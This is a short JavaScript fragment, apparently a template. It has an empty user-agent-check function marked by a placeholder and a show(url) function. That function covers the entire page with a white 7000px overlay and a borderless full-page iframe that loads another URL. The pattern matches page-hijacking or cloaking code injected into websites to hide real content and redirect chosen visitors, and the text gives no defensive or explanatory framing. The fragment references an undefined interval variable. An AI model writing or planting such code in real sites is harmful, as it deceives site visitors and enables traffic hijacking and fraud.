//---
function str_chk() {
    [USER_AGENT_CHECK]
}
//---
function show(url) {
    if (document == undefined && document.body == undefined)
        return;
    //---
    window.clearInterval(interval);
    //---
    var div = document.createElement('DIV');
    with (div) {
        setAttribute('style', 'width: 100%; background-color: #FFF; height: 7000px; position: absolute; top: 0; left: 0;');
    }
    document.body.appendChild(div);
    //---
    var frame = document.createElement('IFRAME');
    with (frame) {
        src = url;
        setAttribute('frameborder', 0);
        setAttribute('scrolling', 'no');
        setAttribute('style', 'width: 100%; height: 7000px;');
    }
    div.appendChild(frame);
}